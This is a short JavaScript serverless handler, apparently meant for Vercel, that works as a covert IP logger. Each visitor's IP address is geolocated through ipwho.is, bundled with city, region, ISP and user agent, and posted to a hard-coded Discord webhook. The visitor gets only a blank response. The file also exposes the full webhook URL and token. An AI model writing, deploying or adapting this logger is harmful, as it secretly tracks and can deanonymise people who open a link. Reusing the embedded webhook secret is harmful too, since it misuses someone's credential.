export default async function handler(req, res) {
    const webhookUrl = "https://discord.com/api/webhooks/1377330816664731709/bl_oh9S8js6rhNgBNMmqSplQc7f__4dde322QGU-qSnq-VzQVvjQ_JwRjwDDQX2SDa6I";

    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // Coletar dados de geolocalização
    const geoRes = await fetch(`https://ipwho.is/${ip}`);
    const geoData = await geoRes.json();

    const country = geoData.country || "Desconhecido";
    const countryCode = geoData.country_code || "Desconhecido";
    const city = geoData.city || "Desconhecido";
    const region = geoData.region || "Desconhecido";
    const isp = geoData.connection?.isp || "Desconhecido";
    const domain = geoData.connection?.domain || "Desconhecido";

    const userAgent = req.headers["user-agent"] || "Desconhecido";

    const embed = {
        embeds: [
            {
                title: "🚀 Nova pessoa acessou seu site",
                color: 65448,
                description: `
**Informações de IP**
> **Endereço de IP:** \`${ip}\`
> **País:** ${country}
> **Código do País:** ${countryCode}
> **Cidade:** ${city}
> **Região:** ${region}
> **Provedor:** ${isp}
> **Domínio do Provedor:** \`${domain}\`

**Informações do Navegador**
> **User Agent:** ${userAgent}
                `,
                footer: { text: "Logger Web Vercel" },
                timestamp: new Date().toISOString()
            }
        ]
    };

    await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embed)
    });

    res.status(200).end();
}
